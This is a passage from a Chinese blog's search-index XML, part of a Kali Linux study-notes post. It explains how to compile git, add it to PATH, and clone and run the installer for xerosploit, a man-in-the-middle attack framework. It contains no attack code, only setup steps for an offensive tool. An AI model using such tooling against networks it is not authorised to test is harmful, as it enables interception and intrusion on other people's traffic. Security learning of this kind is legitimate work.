href="https://blog.csdn.net/xiyangfan/article/details/5321790" target="_blank" rel="noopener">关于configure是什么</a>）</p><p>编译安装</p><p>make &amp;&amp; make install</p><p>将git指令添加到bash中</p><p>vi /etc/profile</p><p>在最后一行加入</p><p>export PATH=$PATH:/usr/local/git/bin（这一步是跟上面的configure是有关的，因为刚装git后的路径不在这里，不信可以wheris看一下）</p><p>让该配置文件立即生效</p><p>source /etc/profile </p><h3 id="好了接下来安装xerosploit"><a href="#好了接下来安装xerosploit" class="headerlink" title="好了接下来安装xerosploit"></a>好了接下来安装xerosploit</h3><p>git clone <a href="https://github.com/LionSec/xerosploit.git" target="_blank" rel="noopener">https://github.com/LionSec/xerosploit.git</a></p><p>安装成功后就可以cd到xerosploit这个目录下了</p><p>进入后先ls看一下，里面有一个install.py的文件</p><p>./install.py运行就好了（记住选1，不然我也不会了）</p><p>还有如果用centos是不能直接用的因为这个py文件用的时apt-get，emmm毕竟centos的同学用的是yum（<a href="http://www.cnblogs.com/qingchen1984/p/5313383.html" target="_blank" rel="noopener">关于centos装apt-get</a>）</p><p>完成之后就可以用了。。。</p><p><img src="http://thyrsi.com/t6/640/1545623533x2890202707.png" srcset="/img/loading.gif" alt="xerosploit完成"></p>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
